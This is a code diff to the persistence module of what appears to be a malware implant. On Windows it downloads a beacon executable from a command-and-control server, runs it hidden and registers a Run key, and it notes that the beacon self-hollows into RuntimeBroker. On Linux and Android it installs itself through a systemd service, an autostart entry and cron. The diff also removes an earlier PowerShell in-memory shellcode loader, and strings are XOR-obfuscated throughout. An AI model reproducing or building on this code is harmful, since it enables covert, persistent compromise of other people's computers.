@@ -22,7 +22,6 @@ namespace persistence {
 #ifdef _WIN32
 
 inline std::string establish_windows(const net::C2Config& cfg, const std::string& name) {
-    // Get %APPDATA% directory
     char appdata[MAX_PATH];
     DWORD appdataLen = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
     if (appdataLen == 0 || appdataLen >= sizeof(appdata)) {
@@ -30,71 +29,50 @@ inline std::string establish_windows(const net::C2Config& cfg, const std::string
     }
 
     std::string dir = std::string(appdata) + "\\Microsoft\\Phantom";
-    std::string payloadPath = dir + "\\phantom.dat";
-    std::string psPath = dir + "\\phantom.ps1";
+    std::string exePath = dir + "\\" + name + ".exe";
 
-    // Create directory
     CreateDirectoryA(dir.c_str(), NULL);
 
-    // ── Step 1: Download XOR-encrypted payload from C2 ──
+    // Download full beacon PE from C2
     std::string payload = net::http_request(cfg,
         XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
-        XOR_WDEC(XOR_WSTR(L"/x")).c_str(), "", "");
+        XOR_WDEC(XOR_WSTR(L"/api/v1/payload")).c_str(), "", "");
     if (payload.empty()) {
-        return std::string("Error: Failed to download beacon payload from C2 (host=")
+        return std::string("Error: Failed to download beacon PE from C2 (host=")
             + std::string(cfg.host.begin(), cfg.host.end()) + ":"
             + std::to_string(cfg.port) + ")";
     }
 
-    // ── Step 2: Save XOR-encrypted payload to disk ──
-    HANDLE hFile = CreateFileA(payloadPath.c_str(), GENERIC_WRITE, 0, NULL,
-                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    // Save beacon PE to disk
+    HANDLE hFile = CreateFileA(exePath.c_str(), GENERIC_WRITE, 0, NULL,
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        return std::string(XOR_DEC(XOR_STR("Error: Failed to write payload to "))) + payloadPath;
+        return std::string(XOR_DEC(XOR_STR("Error: Failed to write beacon to "))) + exePath;
     }
     DWORD written = 0;
     WriteFile(hFile, payload.data(), (DWORD)payload.size(), &written, NULL);
     CloseHandle(hFile);
 
-    // ── Step 3: Write PowerShell loader script ──
-    // Uses Add-Type for VirtualAlloc P/Invoke, reads XOR-encrypted payload from disk,
-    // decrypts with 0xAA, copies to executable memory, and invokes.
-    // NOTE: This string is written to a .ps1 file on disk, not sensitive at rest.
-    std::string ps =
-        std::string("$ErrorActionPreference='Stop';\r\n"
-        "Add-Type -TypeDefinition @'\r\n"
-        "using System;using System.Runtime.InteropServices;public class K{\r\n"
-        "[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr,IntPtr,int,int);}\r\n"
-        "'@;\r\n"
-        "$b=[System.IO.File]::ReadAllBytes(\"") + payloadPath + "\");\r\n"
-        "$k=0xAA;for($i=0;$i-lt$b.Length;$i++){$b[$i]-bxor$k};\r\n"
-        "$p=[K]::VirtualAlloc(0,[IntPtr]$b.Length,0x3000,0x40);\r\n"
-        "[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length);\r\n"
-        "[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[Type](New-Object System.Action)).Invoke()";
-
-    hFile = CreateFileA(psPath.c_str(), GENERIC_WRITE, 0, NULL,
-                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        return std::string(XOR_DEC(XOR_STR("Error: Failed to write loader to "))) + psPath;
+    // Run it once to establish the hollowed child
+    std::string runCmd = std::string("\"") + exePath + "\"";
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {};
+    if (CreateProcessA(NULL, &runCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
     }
-    written = 0;
-    WriteFile(hFile, ps.c_str(), (DWORD)ps.size(), &written, NULL);
-    CloseHandle(hFile);
 
-    // ── Step 4: Create Run key ──
+    // Create Run key so it starts on next login
     HKEY hKey;
-    std::string runCmd = std::string(
-        XOR_DEC(XOR_STR("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \""))
-        .c_str()) + psPath + "\"";
-
     if (RegCreateKeyExA(HKEY_CURRENT_USER,
             XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
             0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-
+        runCmd = std::string("\"") + exePath + "\"";
         if (RegSetValueExA(hKey, name.c_str(), 0, REG_SZ,
                 (const BYTE*)runCmd.c_str(), (DWORD)runCmd.size() + 1) == ERROR_SUCCESS) {
             RegCloseKey(hKey);
-            return std::string("Persist established: RunKey -> ") + runCmd;
+            return std::string("Persist established: RunKey -> ") + runCmd
+                + XOR_DEC(XOR_STR("\nThe beacon PE is saved to disk. On next login it will self-hollow into RuntimeBroker.")).c_str();
         }
         RegCloseKey(hKey);
         return std::string(XOR_DEC(XOR_STR("Error: Failed to set Registry value")));
@@ -107,13 +85,27 @@ inline std::string establish_windows(const net::C2Config& cfg, const std::string
 #elif defined(__linux__)
 
 inline std::string establish_linux(const std::string& name) {
-    char path[1024];
-    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
+    char buf[1024];
+    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
     if (len == -1) return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();
-    path[len] = '\0';
+    buf[len] = '\0';
+    std::string curPath(buf);
+    std::string exeName = curPath.substr(curPath.find_last_of('/') + 1);
 
     std::string home = getenv("HOME") ? getenv("HOME") : "";
     if (home.empty()) return XOR_DEC(XOR_STR("Error: Could not find HOME directory")).c_str();
+
+    // Copy binary to ~/.local/bin/ so it survives /tmp/ cleanup
+    std::string installDir = home + "/.local/bin";
+    mkdir(installDir.c_str(), 0755);
+    std::string installPath = installDir + "/" + exeName;
+    std::ifstream src(curPath, std::ios::binary);
+    std::ofstream dst(installPath, std::ios::binary);
+    if (src.is_open() && dst.is_open()) {
+        dst << src.rdbuf();
+        src.close(); dst.close();
+        chmod(installPath.c_str(), 0755);
+    }
 
     std::string results;
 
@@ -127,13 +119,12 @@ inline std::string establish_linux(const std::string& name) {
             ofs << "[Unit]\n";
             ofs << "Description=" << name << " beacon\n\n";
             ofs << "[Service]\n";
-            ofs << "ExecStart=" << path << "\n";
+            ofs << "ExecStart=" << installPath << "\n";
             ofs << "Restart=always\n";
             ofs << "RestartSec=30\n\n";
             ofs << "[Install]\n";
             ofs << "WantedBy=default.target\n";
             ofs.close();
-            // Try to enable and start
             std::string enableCmd = "systemctl --user enable " + serviceFile + " 2>/dev/null";
             std::string startCmd = "systemctl --user start " + name + ".service 2>/dev/null";
             FILE* fp = popen(enableCmd.c_str(), "r");
@@ -153,7 +144,7 @@ inline std::string establish_linux(const std::string& name) {
         if (ofs.is_open()) {
             ofs << "[Desktop Entry]\n";
             ofs << "Type=Application\n";
-            ofs << "Exec=" << path << "\n";
+            ofs << "Exec=" << installPath << "\n";
             ofs << "Hidden=false\n";
             ofs << "NoDisplay=false\n";
             ofs << "X-GNOME-Autostart-enabled=true\n";
@@ -165,7 +156,7 @@ inline std::string establish_linux(const std::string& name) {
 
     // 3) cron job (runs every 10 minutes)
     {
-        std::string cronLine = "*/10 * * * * " + std::string(path) + "\n";
+        std::string cronLine = "*/10 * * * * " + installPath + "\n";
         std::string cronCmd = "(crontab -l 2>/dev/null; echo '" + cronLine + "') | crontab - 2>/dev/null";
         FILE* fp = popen(cronCmd.c_str(), "r");
         if (fp) pclose(fp);
@@ -230,18 +221,28 @@ inline std::string establish_linux(const std::string& name) {
 #else
 
 inline std::string establish_linux(const std::string& name) {
-    char path[1024];
-    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
+    char buf[1024];
+    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
     if (len == -1) return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();
-    path[len] = '\0';
+    buf[len] = '\0';
+    std::string curPath(buf);
+    std::string exeName = curPath.substr(curPath.find_last_of('/') + 1);
+    std::string installDir = std::string("/data/local/tmp");
+    std::string installPath = installDir + "/" + exeName;
+    std::ifstream src(curPath, std::ios::binary);
+    std::ofstream dst(installPath, std::ios::binary);
+    if (src.is_open() && dst.is_open()) {
+        dst << src.rdbuf();
+        src.close(); dst.close();
+        chmod(installPath.c_str(), 0755);
+    }
 
-    // For Android and other POSIX: try cron (requires root on Android)
-    std::string cronLine = "*/10 * * * * " + std::string(path) + "\n";
+    std::string cronLine = "*/10 * * * * " + installPath + "\n";
     std::string cronCmd = "(crontab -l 2>/dev/null; echo '" + cronLine + "') | crontab - 2>/dev/null";
     FILE* fp = popen(cronCmd.c_str(), "r");
     if (fp) pclose(fp);
 
-    return XOR_DEC(XOR_STR("Native persistence (cron) established: ")).c_str() + std::string(path);
+    return XOR_DEC(XOR_STR("Native persistence (cron) established: ")).c_str() + installPath;
 }
 
 #endif
